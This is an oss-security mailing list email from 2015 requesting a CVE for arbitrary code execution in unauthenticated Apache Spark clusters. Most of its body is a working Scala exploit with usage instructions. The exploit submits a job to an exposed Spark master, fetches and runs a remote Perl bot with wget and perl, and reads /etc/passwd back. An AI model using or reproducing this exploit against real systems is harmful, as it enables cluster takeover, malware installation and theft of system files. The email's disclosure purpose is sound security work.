X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2034" "Thursday" "16" "April" "2015" "23:49:17" "+0530" "Akhil Das" "akhil@sigmoidanalytics.com" "<CAHUQ+_bsF=VoOsFiF7jL4hzuJYU=E=XQW4z1SFHP5+mTubv+KA@mail.gmail.com>" "63" "[oss-security] CVE Request: Arbitary Code Execution in Apache Spark Cluster" nil nil nil "4" "2015041618:19:17" "[oss-security] CVE Request: Arbitary Code Execution in Apache Spark Cluster" (number mark "        akhil@sigmoi Apr 16   63/2034  " thread-indent "\"[oss-security] CVE Request: Arbitary Code Execution in Apache Spark Cluster\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 15908 invoked by uid 550); 16 Apr 2015 18:44:59 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 9791 invoked from network); 16 Apr 2015 18:19:29 -0000
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:date:message-id:subject:from:to
         :content-type;
        bh=t3YgaL8G/5mnQ3T0Uari3EohBQJ2CypBP9j6+4Kq4RU=;
        b=EjqirNv9/i0y7tHOl4uG/qysG8JS0/5xYQ/LRdWCNNkp4Iemff1PRbbing6M4Y3d1T
         wxphMqEo8hwTKK/ag9vzgwqaGjI3Sg+R0sIm4kaBUGO0nHHS35eH4+IaDgXsybxsS21C
         5k+i10AE55XU+52AKDb8Js4kBCVhGuwcxMqrq37Tgzx687TtZaZoXEBWWLFPlMxsvQOr
         lmAjKGy/H8uvICj3uteI6bs1pJhZqWXC49CVKe/ZCpOeaJvHRzTryjTNIjkZHvQoEb9S
         X4lThswavjDVH8z9ccivDHQxRWcxka5Ui31kBBABkQtYOEyQYIJ1BxeI6DhTAtIepMiL
         jrGA==
X-Gm-Message-State: ALoCoQk0rhJXsKFiZjGZ6MkgKK3qXn0HU5rwzPe5csdOvvsXc2uVyT2D69hMHDyBbwUIjwBGUnkO
MIME-Version: 1.0
X-Received: by 10.42.52.4 with SMTP id h4mr39952149icg.32.1429208357989; Thu,
 16 Apr 2015 11:19:17 -0700 (PDT)
Message-ID: <CAHUQ+_bsF=VoOsFiF7jL4hzuJYU=E=XQW4z1SFHP5+mTubv+KA@mail.gmail.com>
Content-Type: multipart/alternative; boundary=485b397dd43d7d06270513db8057
Date: Thu, 16 Apr 2015 23:49:17 +0530
From: Akhil Das <akhil@sigmoidanalytics.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] CVE Request: Arbitary Code Execution in Apache Spark Cluster
To: oss-security@lists.openwall.com

--485b397dd43d7d06270513db8057
Content-Type: text/plain; charset=UTF-8

# *Vendor Homepage*: https://spark.apache.org/
# *Software Link*: https://spark.apache.org/downloads.html
# *Version*: All (0.0.x, 1.1.x, 1.2.x, 1.3.x)
# *Tested on*: 1.2.1

# Reference(s) :
http://codebreach.in/blog/2015/03/arbitary-code-execution-in-unsecured-apache-spark-cluster/
# Exploit URL  : https://github.com/akhld/spark-exploit/

# Spark clusters which are not secured with proper firewall can be taken
over easily (Since it does not have
# any authentication mechanism), this exploit simply runs arbitarty codes
over the cluster.
# All you have to do is, find a vulnerable Spark cluster (usually runs on
port 7077) add that host to your
# hosts list so that your system will recognize it (here its
spark-b-akhil-master pointing
# to 54.155.61.87 in my /etc/hosts) and submit your Spark Job with arbitary
codes that you want to execute.

# Language: Scala


import org.apache.spark.{SparkContext, SparkConf}

/**
 * Created by akhld on 23/3/15.
 */

object Exploit {
  def main(arg: Array[String]) {
    val sconf = new SparkConf()
      .setMaster("spark://spark-b-akhil-master:7077") // Set this to the
vulnerable host URI
      .setAppName("Exploit")
      .set("spark.cores.max", "2")
      .set("spark.executor.memory", "2g")
      .set("spark.driver.host","hacked.work") // Set this to your host from
where you launch the attack

    val sc = new SparkContext(sconf)
      sc.addJar("target/scala-2.10/spark-exploit_2.10-1.0.jar")

    val exploit = sc.parallelize(1 to 1).map(x=>{
       //Replace these with whatever you want to get executed
       val x = "wget https://mallicioushost/mal.pl -O bot.pl".!
       val y = "perl bot.pl".!
       scala.io.Source.fromFile("/etc/passwd").mkString
    })
    exploit.collect().foreach(println)
  }
}




Please see this blog post if you need anymore information on this
http://codebreach.in/blog/2015/03/arbitary-code-execution-in-unsecured-apache-spark-cluster/

--485b397dd43d7d06270513db8057--
